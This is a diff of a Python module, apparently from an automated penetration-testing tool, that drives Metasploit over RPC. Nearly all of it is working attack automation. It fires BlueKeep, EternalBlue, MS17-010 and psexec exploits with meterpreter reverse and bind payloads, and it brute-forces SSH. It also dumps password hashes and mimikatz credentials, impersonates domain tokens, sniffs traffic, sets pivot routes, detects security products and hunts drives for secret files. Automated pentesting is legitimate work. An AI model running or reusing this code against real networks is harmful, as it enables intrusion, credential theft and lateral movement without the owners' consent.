@@ -1,4 +1,3 @@
-# metasploit および meterpreter を実行するモジュール
 from pymetasploit3.msfrpc import MsfRpcClient
 from database import mushilogger
 import pprint
@@ -14,18 +13,15 @@ class MetaSploit():
   def __init__(self):
     print("init metasploit..")
 
-    # mushikago log の出力
     self.mlogger = mushilogger.MushiLogger()
 
 
-  # msfrpc への接続
   def msf_connection(self):
     client = MsfRpcClient('test', port=55553)
     time.sleep(10)
     return client
 
 
-  # exploit の成否のチェック
   def check_exploit(self, i, uuid, sessions_list):
 
     if sessions_list:
@@ -44,40 +40,36 @@ class MetaSploit():
     else:
       print("exploit failed..")
       self.mlogger.writelog("exploit failed...", "info")
-      if i == 2: # 3回失敗したら終了
+      if i == 2:
         print("three times exploit failed..")
         self.mlogger.writelog("three times exploit failed...", "info")
         return -1
 
 
 
-  # BlueKeep の実行
   def execute_bluekeep(self, ipaddr, mushikago_ipaddr):
     client = self.msf_connection()
 
     cid = client.consoles.console().cid
     print('cid = {}'.format(cid))
 
-    # exploit の設定
     exploit = client.modules.use('exploit', 'exploit/windows/rdp/cve_2019_0708_bluekeep_rce')
     exploit['RHOSTS'] = ipaddr
     exploit.target = 8
     
-    # payload の設定
     payloads = ['windows/x64/meterpreter/reverse_tcp', 'windows/x64/meterpreter/bind_tcp']
 
-    for p in payloads: # 成功するまで payload の数分攻撃を試す。
+    for p in payloads:
       payload = client.modules.use('payload', p)
       payload['LHOST'] = mushikago_ipaddr
 
-      for i in range(3): # port 番号を変更して 3 回まで実行する
+      for i in range(3):
         port = random.randint(1023, 65535)
         payload['LPORT'] = str(port)
         
         print(exploit.runoptions)
         print(payload.runoptions)
         
-        # exploit の実行(失敗したら3回まで実行)
         for j in range(3):
           exploit_id = exploit.execute(payload=payload)
           job_id = exploit_id['job_id']
@@ -92,7 +84,6 @@ class MetaSploit():
 
           res = self.check_exploit(i, uuid, client.sessions.list)
 
-          # exploit が成功していた場合
           if res == 0:
             break
         else:
@@ -102,11 +93,9 @@ class MetaSploit():
         continue
       break
 
-      # exploit が成功していた場合
       if res == 0:
         break
 
-    # セッション情報を別リストに格納
     if res == 0:
       session_num = []
       
@@ -118,12 +107,11 @@ class MetaSploit():
       node[num]['session'] = session_num[-1]
   
       return 0
-    else: # 攻撃に失敗した時
+    else:
       print("exploit bluekeep failed...")
       return -1
 
 
-  # eternalblue の実行
   def execute_eternalblue(self, ipaddr, num, node, mushikago_ipaddr):
     client = self.msf_connection()
 
@@ -133,19 +121,17 @@ class MetaSploit():
     #cid = client.consoles.console().cid
     #print('cid = {}'.format(cid))
 
-    # exploit の設定
     exploit = client.modules.use('exploit', 'windows/smb/ms17_010_eternalblue')
     exploit['RHOSTS'] = ipaddr
     
-    # payload の設定
     payloads = ['windows/x64/meterpreter/reverse_tcp', 'windows/x64/meterpreter/bind_tcp']
 
-    for p in payloads: # 成功するまで payload の数だけ攻撃を試す。
+    for p in payloads:
       payload = client.modules.use('payload', p)
-      if p == 'windows/x64/meterpreter/reverse_tcp': # reverse_tcp の時のみ LHOST を設定する
+      if p == 'windows/x64/meterpreter/reverse_tcp':
         payload['LHOST'] = mushikago_ipaddr
 
-      for i in range(3): # port 番号を変更して 3 回まで実行する
+      for i in range(3):
         port = random.randint(1023, 65535)
         payload['LPORT'] = str(port)
         
@@ -158,7 +144,6 @@ class MetaSploit():
         #print("exploit option = {}".format(exploit.runoptions))
         #print("payload option = {}".format(payload.runoptions))
         
-        # exploit の実行(失敗したら3回まで実行)
         for j in range(3):
           exploit_id = exploit.execute(payload=payload)
           job_id = exploit_id['job_id']
@@ -174,7 +159,6 @@ class MetaSploit():
 
           res = self.check_exploit(j, uuid, client.sessions.list)
 
-          # exploit が成功していた場合
           if res == 0:
             break
         else:
@@ -184,7 +168,6 @@ class MetaSploit():
         continue
       break
 
-    # セッション情報を別リストに格納
     if res == 0:
       session_num = []
       
@@ -196,13 +179,12 @@ class MetaSploit():
       node[num]['session'] = session_num[-1]
 
       return 0
-    else: # 攻撃に失敗した時
+    else:
       print("exploit eternalblue failed...")
       self.mlogger.writelog("exploit eternalblue failed...", "info")
       return -1
     
   
-  # ms17_010 psexec の実行
   def execute_ms17_10_psexec(self, ipaddr, num, node, mushikago_ipaddr, account, password):
     client = self.msf_connection()
 
@@ -213,21 +195,19 @@ class MetaSploit():
     self.mlogger.writelog("account = " + account, "info")
     self.mlogger.writelog("password = " + password, "info")
 
-    # exploit setting
     exploit = client.modules.use('exploit', 'windows/smb/ms17_010_psexec')
     exploit['RHOSTS'] = ipaddr
     exploit['SMBUser'] = account
     exploit['SMBPass'] = password
     
-    # payload setting
     payloads = ['windows/x64/meterpreter/bind_tcp', 'windows/x64/meterpreter/reverse_tcp']
 
-    for p in payloads: # 成功するまで payload の数分攻撃を試す。
+    for p in payloads:
       payload = client.modules.use('payload', p)
-      if p == 'windows/x64/meterpreter/reverse_tcp': # reverse_tcp の時のみ LHOST を設定する
+      if p == 'windows/x64/meterpreter/reverse_tcp':
         payload['LHOST'] = mushikago_ipaddr
 
-      for i in range(3): # port 番号を変更して 3 回まで実行する
+      for i in range(3):
       #for i in range(1): # test
         port = random.randint(1023, 65535)
         payload['LPORT'] = str(port)
@@ -241,7 +221,6 @@ class MetaSploit():
         #print("exploit option = {}".format(exploit.runoptions))
         #print("payload option = {}".format(payload.runoptions))
         
-        # exploit の実行(失敗したら3回まで実行)
         for j in range(3):
         #for j in range(1): # test
           exploit_id = exploit.execute(payload=payload)
@@ -258,7 +237,6 @@ class MetaSploit():
 
           res = self.check_exploit(i, uuid, client.sessions.list)
 
-          # exploit が成功していた場合
           if res == 0:
             break
         else:
@@ -268,7 +246,6 @@ class MetaSploit():
         continue
       break
 
-    # セッション情報を別リストに格納
     if res == 0:
       session_num = []
       
@@ -280,13 +257,12 @@ class MetaSploit():
       node[num]['session'] = session_num[-1]
   
       return 0
-    else: # 攻撃に失敗した時
+    else:
       print("exploit eternalblue psexec failed...")
       self.mlogger.writelog("exploit eternalblue psexec failed...", "info")
       return -1
 
 
-  # psexec の実行
   def execute_psexec(self, ipaddr, num, node, mushikago_ipaddr, account, password, domain):
     client = self.msf_connection()
 
@@ -299,22 +275,20 @@ class MetaSploit():
     self.mlogger.writelog("password = " + password, "info")
     self.mlogger.writelog("domain = " + domain, "info")
 
-    # exploit の設定
     exploit = client.modules.use('exploit', 'windows/smb/psexec')
     exploit['RHOSTS'] = ipaddr
     exploit['SMBUser'] = account
     exploit['SMBPass'] = password
     exploit['SMBDomain'] = domain
     
-    # payload の設定
     payloads = ['windows/x64/meterpreter/bind_tcp', 'windows/x64/meterpreter/reverse_tcp']
 
-    for p in payloads: # 成功するまで payload の数分攻撃を試す。
+    for p in payloads:
       payload = client.modules.use('payload', p)
-      if p == 'windows/x64/meterpreter/reverse_tcp': # reverse_tcp の時のみ LHOST を設定する
+      if p == 'windows/x64/meterpreter/reverse_tcp':
         payload['LHOST'] = mushikago_ipaddr
 
-      for i in range(3): # port 番号を変更して 3 回まで実行する
+      for i in range(3):
         port = random.randint(1023, 65535)
         payload['LPORT'] = str(port)
         
@@ -327,7 +301,6 @@ class MetaSploit():
         #print("exploit option = {}".format(exploit.runoptions))
         #print("payload option = {}".format(payload.runoptions))
         
-        # exploit の実行(失敗したら3回まで実行)
         for j in range(3):
           exploit_id = exploit.execute(payload=payload)
           job_id = exploit_id['job_id']
@@ -343,7 +316,6 @@ class MetaSploit():
 
           res = self.check_exploit(i, uuid, client.sessions.list)
 
-          # exploit が成功していた場合
           if res == 0:
             break
         else:
@@ -353,7 +325,6 @@ class MetaSploit():
         continue
       break
 
-    # セッション情報を別リストに格納
     if res == 0:
       session_num = []
       
@@ -365,13 +336,12 @@ class MetaSploit():
       node[num]['session'] = session_num[-1]
   
       return 0
-    else: # 攻撃に失敗した時
+    else:
       print("exploit psexec failed...")
       self.mlogger.writelog("exploit psexec failed...", "info")
       return -1
 
 
-  # ssh bruteforce の実行
   def execute_ssh_bruteforce(self, ipaddr, num, node):
   #def execute_ssh_bruteforce(self, ipaddr):
     client = self.msf_connection()
@@ -382,7 +352,6 @@ class MetaSploit():
     cid = client.consoles.console().cid
     print('cid = {}'.format(cid))
 
-    # ssh_login の設定
     run = client.modules.use('auxiliary', 'scanner/ssh/ssh_login')
     run['RHOSTS'] = ipaddr
     run['USERPASS_FILE'] = "./root_userpass.txt"
@@ -404,11 +373,9 @@ class MetaSploit():
 
     session_num = ""
 
-    # アカウント情報の抽出
     #pattern = 'SSH (.*:)(.*()'
     pattern = 'SSH (.*)(:)(.*)(\(.*)'
 
-    # セッション確立の確認
     if client.sessions.list:
       for key in client.sessions.list.keys():
         if ipaddr == client.sessions.list[key]["target_host"] and "SSH" in client.sessions.list[key]["info"]:
@@ -424,14 +391,12 @@ class MetaSploit():
           self.mlogger.writelog("password = " + password, "info")
           break
 
-    # Judge failed
     if session_num == "":
       return -1
 
     node[num]["local_account_pass"].append(account)
     node[num]["local_account_pass"].append(password)
 
-    # shell to meterpreter
     if session_num != "":
       print("execute sshexec...")
       self.mlogger.writelog("execute sshexec...", "info")
@@ -441,10 +406,9 @@ class MetaSploit():
       exploit['USERNAME'] = account
       exploit['PASSWORD'] = password
 
-      # payload の設定
       #payload = client.modules.use('payload', 'linux/x86/meterpreter/bind_nonx_tcp')
       payload = client.modules.use('payload', 'linux/x86/meterpreter/bind_tcp')
-      for i in range(5): # port 番号を変更して 3 回まで実行する
+      for i in range(5):
         port = random.randint(1023, 65535)
         payload['LPORT'] = str(port)
         
@@ -457,7 +421,6 @@ class MetaSploit():
         #print("exploit option = {}".format(exploit.runoptions))
         #print("payload option = {}".format(payload.runoptions))
         
-        # exploit の実行(失敗したら3回まで実行)
         for j in range(6):
           exploit_id = exploit.execute(payload=payload)
           job_id = exploit_id['job_id']
@@ -473,14 +436,12 @@ class MetaSploit():
 
           res = self.check_exploit(j, uuid, client.sessions.list)
 
-          # exploit が成功していた場合
           if res == 0:
             break
         else:
           continue
         break
 
-    # セッション情報を別リストに格納
     if res == 0:
       session_num = []
       
@@ -517,14 +478,12 @@ class MetaSploit():
 
 
 
-  # load incognito の実行
   def execute_incognito(self):
     client = self.msf_connection()
 
     print("execute incognito..")
     self.mlogger.writelog("execute incognito...", "info")
 
-    # セッション情報を別リストに格納
     session_num = []
     
     print("Sessions avaiables : ")
@@ -550,17 +509,14 @@ class MetaSploit():
     print(client.sessions.session(session_num[0]).read())
 
 
-  # network sniffing の実行 (for Windows)
   def execute_sniff_win(self, num, node):
     client = self.msf_connection()
 
     print("execute network sniffing..")
     self.mlogger.writelog("execute network sniffing...", "info")
 
-    # セッション情報を別リストに格納
     session_num = node[num]['session']
 
-    # load sniffer
     client.sessions.session(session_num).write('load sniffer')
     time.sleep(10)
     #print(client.sessions.session(session_num).read())
@@ -577,7 +533,6 @@ class MetaSploit():
 
     rows = result.splitlines()
     
-    # packet capture できる interface list を取得
     for row in rows:
       if "type:" in row.lower():
         result = re.match(pattern, row)
@@ -585,7 +540,6 @@ class MetaSploit():
     
     #print("interface_list = {}".format(interface_list))
 
-    # 存在する interface を順番に capture していく
     for interface in interface_list:
       client.sessions.session(session_num).write('sniffer_start ' + interface)
       time.sleep(10)
@@ -615,22 +569,19 @@ class MetaSploit():
 
         node[num]["pcap_list"].append(filename)
 
-      else: # capture が失敗した場合
+      else:
         print("Failed capture network interface {}...".format(interface))
         self.mlogger.writelog("Failed capture network interface " + interface, "error")
 
 
-  # network sniffing の実行 (for Linux)
   def execute_sniff_linux(self, num, node):
     client = self.msf_connection()
 
     print("execute network sniffing for Linux..")
     self.mlogger.writelog("execute network sniffing for Linux...", "info")
 
-    # セッション情報を別リストに格納
     session_num = node[num]['session']
 
-    # ipconfig コマンドより NIC 情報を収集
     client.sessions.session(session_num).write('ipconfig')
     time.sleep(10)
     #print(client.sessions.session(session_num).read())
@@ -672,14 +623,12 @@ class MetaSploit():
 
 
 
-  # kiwi(mimikatz) の実行
   def execute_kiwi(self):
     client = self.msf_connection()
 
     print("execute kiwi..")
     self.mlogger.writelog("execute kiwi...", "info")
 
-    # セッション情報を別リストに格納
     session_num = []
     
     print("Sessions avaiables : ")
@@ -709,7 +658,6 @@ class MetaSploit():
 
 
 
-  # arp-scan.exe を実行し、出力結果を取得し、ファイルを削除する
   def execute_arpscan(self, nwaddr, cidr, node, node_num):
     client = self.msf_connection()
 
@@ -717,8 +665,8 @@ class MetaSploit():
     self.mlogger.writelog("execute arpscan " + str(nwaddr) + cidr, "info")
 
     with open('./bat/arp-scan.bat', 'w') as f:
-      #f.write(".\\arp-scan.exe -t " + nwaddr + cidr + " > arp-scan.log")
-      f.write(".\\arp-scan.exe -t " + "10.3.200.0" + "/24" + " > arp-scan.log") # test
+      f.write(".\\arp-scan.exe -t " + nwaddr + cidr + " > arp-scan.log")
+      #f.write(".\\arp-scan.exe -t " + "10.3.200.0" + "/24" + " > arp-scan.log") # test
 
     session_num = node[node_num]['session']
 
@@ -733,8 +681,8 @@ class MetaSploit():
     self.mlogger.writelog(client.sessions.session(session_num).read(), "info")
   
     client.sessions.session(session_num).write('execute -f arp-scan.bat')
-    #time.sleep(1200) # 20 minutes
-    time.sleep(120) # test
+    time.sleep(1200) # 20 minutes
+    #time.sleep(120) # test
     #print(client.sessions.session(session_num).read())
     self.mlogger.writelog(client.sessions.session(session_num).read(), "info")
   
@@ -749,7 +697,6 @@ class MetaSploit():
     self.mlogger.writelog(client.sessions.session(session_num).read(), "info")
 
 
-  # ルーティングの設定
   def setting_route(self, network_addr, netmask, session_num):
     client = self.msf_connection()
 
@@ -759,7 +706,6 @@ class MetaSploit():
     cid = client.consoles.console().cid
     print('cid = {}'.format(cid))
 
-    # ルーティングの設定
     route = 'route add' + " " + network_addr + " " + netmask + " " + session_num
     print(route)
 
@@ -774,7 +720,6 @@ class MetaSploit():
     self.mlogger.writelog(client.consoles.console(cid).read(), "info")
 
 
-  # socks プロキシの起動
   def execute_socks(self):
     client = self.msf_connection()
 
@@ -789,7 +734,6 @@ class MetaSploit():
     print(job_id)
 
 
-  # ハッシュ値のスクレイピング
   def hash_scrape(self, hashdump):
     #print(hashdump)
 
@@ -804,7 +748,6 @@ class MetaSploit():
     #print(res)
     #print(len(res))
   
-    # ユーザとパスワードの取得
     res = re.findall(pettern_user_pass, hashdump)
 
     for i in range(len(res)):
@@ -813,7 +756,6 @@ class MetaSploit():
       pass_list.append(res[i][0])
       pass_list.append(res[i][1].replace('\u0000', ''))
 
-    # ユーザとhash値の取得
     res = re.findall(pettern_user_hash, hashdump)
 
     for i in range(len(res)):
@@ -824,11 +766,9 @@ class MetaSploit():
 
     return pass_list, hash_list
 
-  # ハッシュ値の取得
   def get_hash(self, ipaddr, num, node):
     client = self.msf_connection()
 
-    # セッション情報を別リストに格納
     #session_num = []
     #
     #print("Sessions avaiables : ")
@@ -841,14 +781,12 @@ class MetaSploit():
     pass_list = []
     hash_list = []
 
-    # meterpreter コマンド実行
     client.sessions.session(session_num).write('run post/windows/gather/smart_hashdump')
     time.sleep(10)
     hashdump = client.sessions.session(session_num).read()
     print(hashdump)
     self.mlogger.writelog(hashdump, "info")
 
-    # hash値の抽出
     pass_list, hash_list = self.hash_scrape(hashdump)
     print("pass_list = {}".format(pass_list))
     print("hash_list = {}".format(hash_list))
@@ -864,11 +802,9 @@ class MetaSploit():
     #return smbuser, smbpass
 
 
-  # 仮想環境のチェック
   def check_vm():
     client = self.msf_connection()
 
-    # セッション情報を別リストに格納
     session_num = []
     
     print("Sessions avaiables : ")
@@ -876,25 +812,20 @@ class MetaSploit():
       session_num.append(str(s))
       print(session_num)
 
-    # meterpreter コマンド実行
     client.sessions.session(session_num[0]).write('run post/windows/gather/checkvm')
     time.sleep(10)
     print(client.sessions.session(session_num[0]).read())
 
     
-  # DC のチェック
   def check_dc():
-    # meterpreter コマンド実行
     client.sessions.session(session_num[0]).write('run post/windows/gather/enum_domain')
     time.sleep(10)
     print(client.sessions.session(session_num[0]).read())
 
 
-  # zerologon(cve-2020-1472) の実行
   def execute_zerologon():
     client = self.msf_connection()
 
-    # exploit の設定
     exploit = client.modules.use('auxiliary', 'admin/dcerpc/cve_2020_1472_zerologon')
     exploit['NMNAME'] = "WIN-XXXX"
     exploit['RHOSTS'] = ipaddr
@@ -903,17 +834,14 @@ class MetaSploit():
     exploit.check()
 
 
-  # ipconfig から IP アドレスを取得
   def execute_ipconfig(self, num, node):
     client = self.msf_connection()
 
-    # セッション情報を別リストに格納
     session_num = node[num]['session']
 
     print("execute ipconfig...")
     self.mlogger.writelog("execute ipconfig...", "info")
     
-    # meterpreter にて ipconfig コマンド実行
     client.sessions.session(session_num).write('ipconfig')
     time.sleep(10)
     result = client.sessions.session(session_num).read()
@@ -946,17 +874,14 @@ class MetaSploit():
     ipaddr_info.clear()
 
 
-  # netstat から establish な 接続先 IP アドレスを取得
   def execute_netstat(self, num, node):
     client = self.msf_connection()
 
-    # セッション情報を別リストに格納
     session_num = node[num]['session']
 
     print("execute netstat...")
     self.mlogger.writelog("execute netstat...", "info")
     
-    # meterpreter にて netstat コマンド実行
     client.sessions.session(session_num).write('netstat')
     time.sleep(10)
     result = client.sessions.session(session_num).read()
@@ -985,16 +910,13 @@ class MetaSploit():
     netstat_info.clear()
 
 
-  # ps からセキュリティ製品がないか判別
   def execute_ps(self, num, node):
     client = self.msf_connection()
-    # セッション情報を別リストに格納
     session_num = node[num]['session']
 
     print("execute ps...")
     self.mlogger.writelog("execute ps...", "info")
 
-    # meterpreter にて ps コマンド実行
     client.sessions.session(session_num).write('ps')
     time.sleep(10)
     result = client.sessions.session(session_num).read()
@@ -1004,7 +926,6 @@ class MetaSploit():
     rows = result.splitlines()
     ps_list = []
 
-    # ps コマンドからプロセスを抽出
     for row in rows:
       c = row.split()
       if len(c) >= 7 and ".exe" in c[2]:
@@ -1014,10 +935,8 @@ class MetaSploit():
     print("ps_list = {}".format(ps_list))
     self.mlogger.writelog("process list = " + pprint.pformat(ps_list), "info")
 
-    # プロセスリストを保存
     node[num]['process_list'] = copy.deepcopy(ps_list)
 
-    # JSON から製品名を取り出し
     json_open = open('./arsenal/security_tool.json', 'r')
     json_load = json.load(json_open)
 
@@ -1027,7 +946,6 @@ class MetaSploit():
       #print(key)
       for value in values:
         for ps in ps_list:
-          # セキュリティ製品のプロセスがないかチェック
           if (value.lower() + ".exe" == ps.lower()):
             st_list.append(key)
             break
@@ -1035,7 +953,6 @@ class MetaSploit():
     print("st_list = {}".format(st_list))
     self.mlogger.writelog("security tool list = " + pprint.pformat(st_list), "info")
 
-    # セキュリティツールを保存
     node[num]['security_tool'] = copy.deepcopy(st_list)
 
     ps_list.clear()
@@ -1043,17 +960,14 @@ class MetaSploit():
 
 
 
-  # net user からローカルアカウントの一覧を取得
   def execute_netuser(self, num, node):
     client = self.msf_connection()
 
     print("execute get local_user info...")
     self.mlogger.writelog("execute get local_user info...", "info")
 
-    # セッション情報を別リストに格納
     session_num = node[num]['session']
 
-    # net user コマンド実行
     client.sessions.session(session_num).write('upload ./bat/net-user.bat')
     time.sleep(10)
     #print(client.sessions.session(session_num).read())
@@ -1074,23 +988,19 @@ class MetaSploit():
     #print(client.sessions.session(session_num).read())
     self.mlogger.writelog(client.sessions.session(session_num).read(), "info")
 
-    # net-user.log からローカルアカウントを取得
     local_account= []
     flag = 0
 
     with open('net-user.log', 'r') as f:
       for row in f:
-        # 終了判定
         if 'command' in row.lower() and "completed" in row.lower():
           break
         elif 'コマンド' in row.lower() and "終了" in row.lower():
           break
-        # ユーザアカウントの取得
         if flag == 1:
           #print(row)
           c = row.split()
           local_account += c
-        # 開始判定
         if '-------' in row:
           flag = 1
     
@@ -1101,17 +1011,14 @@ class MetaSploit():
     local_account.clear()
 
 
-  # net user /domain からドメインアカウントの一覧を取得
   def execute_netuserdomain(self, num, node):
     client = self.msf_connection()
 
     print("execute get domain_user info...")
     self.mlogger.writelog("execute get domain_user info...", "info")
 
-    # セッション情報を別リストに格納
     session_num = node[num]['session']
 
-    # net user /domain を実行
     client.sessions.session(session_num).write('upload ./bat/net-user-domain.bat')
     time.sleep(10)
     #print(client.sessions.session(session_num).read())
@@ -1132,33 +1039,28 @@ class MetaSploit():
     #print(client.sessions.session(session_num).read())
     self.mlogger.writelog(client.sessions.session(session_num).read(), "info")
   
-    # net-user-domain.log からドメインユーザを抽出
     pattern = '.*(for domain )(.*)'
     domain_account= []
     flag = 0
     
     with open('net-user-domain.log', 'r') as f:
       for row in f:
-        # 終了判定
         if 'command' in row.lower() and "completed" in row.lower():
           break
         elif 'コマンド' in row.lower() and "終了" in row.lower():
           break
-        # domain 特定
         if 'request' in row.lower() and "processed" in row.lower():
           result = re.match(pattern, row)
-          domain_info = result.group(2)[:-1] # 最後の一文字（ドット）を削除
+          domain_info = result.group(2)[:-1] # delete dot
           print("domain_info = {}".format(domain_info))
         elif '要求' in row.lower() and "処理" in row.lower():
           result = re.match(pattern, row)
-          domain_info = result.group(2)[:-1] # 最後の一文字（ドット）を削除
+          domain_info = result.group(2)[:-1] # delete dot
           print("domain_info = {}".format(domain_info))
-        # ユーザアカウントの取得
         if flag == 1:
           #print(row)
           c = row.split()
           domain_account += c
-        # 開始判定
         if '-------' in row:
           flag = 1
     
@@ -1170,17 +1072,14 @@ class MetaSploit():
     domain_account.clear()
 
 
-  # net use からネットワークドライブの一覧を取得
   def execute_netuse(self, num, node):
     client = self.msf_connection()
 
-    # セッション情報を別リストに格納
     session_num = node[num]['session']
 
     print("execute netuse...")
     self.mlogger.writelog("execute netuse...", "info")
 
-    # net use コマンド実行
     client.sessions.session(session_num).write('upload ./bat/net-use.bat')
     time.sleep(10)
     #print(client.sessions.session(session_num).read())
@@ -1201,23 +1100,19 @@ class MetaSploit():
     #print(client.sessions.session(session_num).read())
     self.mlogger.writelog(client.sessions.session(session_num).read(), "info")
 
-    # net-use.log からドメインユーザを抽出
     nw_drive = []
     flag = 0
 
     with open('net-use.log', 'r') as f:
       for row in f:
-        # 終了判定
         if 'command' in row.lower() and "completed" in row.lower():
           break
         elif 'コマンド' in row.lower() and "終了" in row.lower():
           break
-        # ネットワークドライブを取得
         if flag == 1:
           #print(row)
           c = row.split()
           nw_drive.append(c[2])
-        # 開始判定
         if '-------' in row:
           flag = 1
 
@@ -1228,7 +1123,6 @@ class MetaSploit():
     nw_drive.clear()
 
 
-  # creds tspkg からドメインアカウントとパスワードを取得
   def execute_creds_tspkg(self, num, node):
     client = self.msf_connection()
 
@@ -1237,7 +1131,6 @@ class MetaSploit():
     print("execute creds_tspkg...")
     self.mlogger.writelog("execute creds_tspkg...", "info")
 
-    # kiwi にて creds tspkg コマンド実行
     client.sessions.session(session_num).write('load kiwi')
     time.sleep(20)
     #print(client.sessions.session(session_num).read())
@@ -1254,11 +1147,9 @@ class MetaSploit():
     flag = 0
     
     for row in rows:
-      # ユーザアカウントの取得
       if flag == 1:
         #print(row)
         domain_list += row.split()
-      # 開始判定
       if '-------' in row:
         flag = 1
     flag = 0
@@ -1270,7 +1161,6 @@ class MetaSploit():
     domain_list.clear()
 
 
-  # OS のパッチ情報と脆弱性情報を取得
   def execute_getospatch(self, num, node):
     client = self.msf_connection()
 
@@ -1279,7 +1169,6 @@ class MetaSploit():
     print("execute get ospatch...")
     self.mlogger.writelog("execute get ospatch...", "info")
     
-    # systeminfo を実行し、出力結果を取得し、ファイルを削除する
     client.sessions.session(session_num).write('upload ./bat/systeminfo.bat')
     time.sleep(10)
     #print(client.sessions.session(session_num).read())
@@ -1300,8 +1189,7 @@ class MetaSploit():
     #print(client.sessions.session(session_num).read())
     self.mlogger.writelog(client.sessions.session(session_num).read(), "info")
 
-    # wes.py を実行し、OS パッチ情報と脆弱性情報を取得する
-    try: # wes.py のディレクトリ場所移動やパスの設定を行う必要がある
+    try:
       result = subprocess.check_output('python3 ../wesng/wes.py --definitions ../wesng/definitions.zip -d --muc-lookup systeminfo.txt | grep -e \"Installed hotfixes\" -e \"CVE\" | sort -u', shell=True).decode('utf-8')
       print(result)
       self.mlogger.writelog("wes.py result = " + result, "info")
@@ -1315,7 +1203,6 @@ class MetaSploit():
     os_patch_list = []
     local_vuln_list = []
 
-    # OS のパッチ情報を取得
     pattern = '(.*): (.*).*'
 
     for row in rows:
@@ -1331,7 +1218,6 @@ class MetaSploit():
     self.mlogger.writelog("os_patch_list = " + pprint.pformat(os_patch_list), "info")
     node[num]['os_patches'] = copy.deepcopy(os_patch_list)
 
-    # OS の脆弱性情報を取得
     pattern = 'CVE: (.*).*'
 
     for row in rows:
@@ -1349,7 +1235,6 @@ class MetaSploit():
     local_vuln_list.clear()
 
 
-  # ローカルドライブ情報を取得
   def execute_getmaindrvinfo(self, num, node):
     client = self.msf_connection()
 
@@ -1358,7 +1243,6 @@ class MetaSploit():
     print("execute get maindrvinfo..")
     self.mlogger.writelog("execute get maindrvinfo...", "info")
     
-    # ローカルドライブ情報を取得
     client.sessions.session(session_num).write('show_mount')
     time.sleep(10)
     result = client.sessions.session(session_num).read()
@@ -1371,15 +1255,12 @@ class MetaSploit():
     flag = 0
 
     for row in rows:
-      # 終了判定
       if flag == 1 and '.' not in row.lower():
         break
-      # ネットワークドライブを取得
       if flag == 1:
         c = row.split()
         local_drv.append(c[0])
         local_drv.append(c[1])
-      # 開始判定
       if '----' in row:
         flag = 1
 
@@ -1392,7 +1273,6 @@ class MetaSploit():
     local_drv.clear()
 
 
-  # ローカルドライブの機密情報を取得
   def execute_getlocalsecretinfo(self, num, node):
     client = self.msf_connection()
 
@@ -1401,7 +1281,6 @@ class MetaSploit():
     print("execute get localsecretinfo...")
     self.mlogger.writelog("execute get localsecretinfo...", "info")
     
-    # %temp% に移動し、mushikago_secret.txt がないか探索
     client.sessions.session(session_num).write('pwd')
     time.sleep(10)
     #print(client.sessions.session(session_num).read())
@@ -1420,10 +1299,10 @@ class MetaSploit():
     rows = result.splitlines()
     print(rows)
 
-    secret_data = -1 # 発見できなかった場合は、-1 
+    secret_data = -1
 
     for row in rows:
-      if "mushikago_secret" in row: # 発見した場合
+      if "mushikago_secret" in row:
         print("find secret_data = {}".format(row))
         secret_data = 1
         break
@@ -1437,7 +1316,6 @@ class MetaSploit():
     return secret_data
 
 
-  # ネットワークドライブの機密情報を取得
   def execute_getnwsecretinfo(self, num, node):
     client = self.msf_connection()
 
@@ -1445,56 +1323,11 @@ class MetaSploit():
 
     #print("execute systeminfo..")
 
-    # nwdrv を取得する
     value = iter(node[num]["network_drive"])
 
-    secret_data = -1 # 発見できなかった場合は、-1
+    secret_data = -1
 
-    # test
-    client.sessions.session(session_num).write('getuid')
-    time.sleep(10)
-    print(client.sessions.session(session_num).read())
 
-    client.sessions.session(session_num).write('load incognito')
-    time.sleep(10)
-    print(client.sessions.session(session_num).read())
-
-    client.sessions.session(session_num).write('list_tokens -u')
-    time.sleep(20)
-    print(client.sessions.session(session_num).read())
-
-    client.sessions.session(session_num).write('impersonate_token ONIGIRI\\\\Administrator')
-
-    client.sessions.session(session_num).write('getuid')
-    time.sleep(10)
-    print(client.sessions.session(session_num).read())
-
-    client.sessions.session(session_num).write('cd Z:')
-    time.sleep(10)
-    print(client.sessions.session(session_num).read())
-
-    client.sessions.session(session_num).write('dir')
-    time.sleep(10)
-    result = client.sessions.session(session_num).read()
-
-    rows = result.splitlines()
-    print(rows)
-
-    for row in rows:
-      if "mushikago_secret" in row: # 発見した場合
-        print("find secret_data = {}".format(row))
-        secret_data = 1
-        break
-    
-    print("secret_data = {}".format(secret_data))
-    node[num]['secret_data'] = secret_data
-
-    return secret_data
-    # test end
-
-    # nwdrv に移動し、mushikago_secret.txt がないか探索
-
-    # nwdrv に移動し、mushikago_secret.txt がないか探索
     for nwdrv, drv_type in zip(value, value):
       client.sessions.session(session_num).write('pwd')
       time.sleep(10)
@@ -1512,7 +1345,7 @@ class MetaSploit():
       print(rows)
 
       for row in rows:
-        if "mushikago_secret" in row: # 発見した場合
+        if "mushikago_secret" in row:
           print("find secret_data = {}".format(row))
           secret_data = 1
           break
@@ -1525,162 +1358,3 @@ class MetaSploit():
 
     return secret_data
 
-
-  # test script
-  # test script
-  # test script
-  # test script
-  # test script
-  # test script
-  def execute_netuserdomain2(self):
-    client = self.msf_connection()
-
-    print("get domain_user info...")
-
-    # セッション情報を別リストに格納
-    session_num = "5" 
-
-    # net user /domain を実行
-    client.sessions.session(session_num).write('upload ./bat/net-user-domain.bat')
-    time.sleep(10)
-    print(client.sessions.session(session_num).read())
-  
-    client.sessions.session(session_num).write('execute -f net-user-domain.bat')
-    time.sleep(20)
-    print(client.sessions.session(session_num).read())
-  
-    client.sessions.session(session_num).write('download net-user-domain.log')
-    time.sleep(30)
-    print(client.sessions.session(session_num).read())
-
-    client.sessions.session(session_num).write('rm net-user-domain.bat net-user-domain.log')
-    time.sleep(20)
-    print(client.sessions.session(session_num).read())
-  
-    # net-user-domain.log からドメインユーザを抽出
-    pattern = '.*(for domain )(.*)'
-    domain_account= []
-    flag = 0
-    
-    with open('net-user-domain.log', 'r') as f:
-      for row in f:
-        # 終了判定
-        if 'command' in row.lower() and "completed" in row.lower():
-          break
-        elif 'コマンド' in row.lower() and "終了" in row.lower():
-          break
-        # domain 特定
-        if 'request' in row.lower() and "processed" in row.lower():
-          result = re.match(pattern, row)
-          domain_info = result.group(2)[:-1] # 最後の一文字（ドット）を削除
-          print("domain_info = {}".format(domain_info))
-        elif '要求' in row.lower() and "処理" in row.lower():
-          result = re.match(pattern, row)
-          domain_info = result.group(2)[:-1] # 最後の一文字（ドット）を削除
-          print("domain_info = {}".format(domain_info))
-        # ユーザアカウントの取得
-        if flag == 1:
-          #print(row)
-          c = row.split()
-          domain_account += c
-        # 開始判定
-        if '-------' in row:
-          flag = 1
